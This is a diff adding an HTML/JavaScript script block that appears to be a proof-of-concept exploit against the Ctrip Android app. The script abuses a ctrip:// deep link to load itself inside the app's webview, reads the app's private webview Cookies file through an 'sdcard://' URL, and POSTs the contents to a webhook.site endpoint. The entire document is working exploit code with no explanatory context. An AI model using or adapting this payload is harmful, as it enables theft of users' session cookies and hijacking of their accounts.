@@ -1,0 +1,38 @@
+<script>
+var upload_url = "https://webhook.site/0be7e775-b6ea-4120-b067-50b287209da4";
+var theft_file = "/data/data/ctrip.android.view/app_webview/Default/Cookies";
+
+
+if(window._VideoEnabledWebView == undefined){
+	document.write("<h1><a href=\"ctrip://wireless/h5?url=" + btoa(upload_url) + "&type=5\">ctrip.com</a></h1>");
+	location.href = "ctrip://wireless/h5?url=" + btoa(upload_url) + "&type=5";
+
+
+}else{
+var full_theft_file_url = "sdcard://www.ctrip.com" + theft_file;
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+  if (xhr.readyState == XMLHttpRequest.DONE) {
+    // alert(xhr.responseText);
+    var form_data = new FormData();
+    form_data.append("uploadfile", xhr.responseText);
+    fetch(upload_url, {
+        method: 'POST',
+        body: form_data,
+        mode: 'no-cors'
+    })
+    .then(response => {
+        if (response.ok) {
+            // Handle successful response if needed
+            console.log('Request succeeded with status', response.status);
+        } else {
+            // Handle errors if needed
+            console.error('Request failed with status', response.status);
+        }
+    })
+  }
+}
+xhr.open('GET', full_theft_file_url, true);
+xhr.send(null);
+}
+</script>
